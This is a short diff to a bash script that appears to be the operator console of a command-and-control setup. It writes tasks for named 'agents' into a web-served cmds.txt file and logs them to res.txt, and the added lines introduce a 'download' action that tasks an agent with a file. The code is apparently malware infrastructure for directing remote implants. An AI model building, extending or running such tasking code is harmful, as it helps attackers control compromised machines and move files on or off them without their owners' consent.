@@ -25,6 +25,16 @@ echo "Task to $agent => $action $cmd" >> /var/www/html/res.txt
 sleep 2
 clear
 
+elif [ "$action" = "download" ]; then
+echo "Agent ?"
+read agent
+echo "Ze File ?"
+read file
+echo "$agent:$action:$file" >> /var/www/html/cmds.txt
+echo "Task to $agent => $action $file" >> /var/www/html/res.txt
+sleep 2
+clear
+
 
 elif [ "$action" = "clear" ]; then
 echo "file?"
@@ -49,5 +59,7 @@ fi
 else
 echo "Unknown cmd"
 sleep 2
+clear
 fi
+
 done
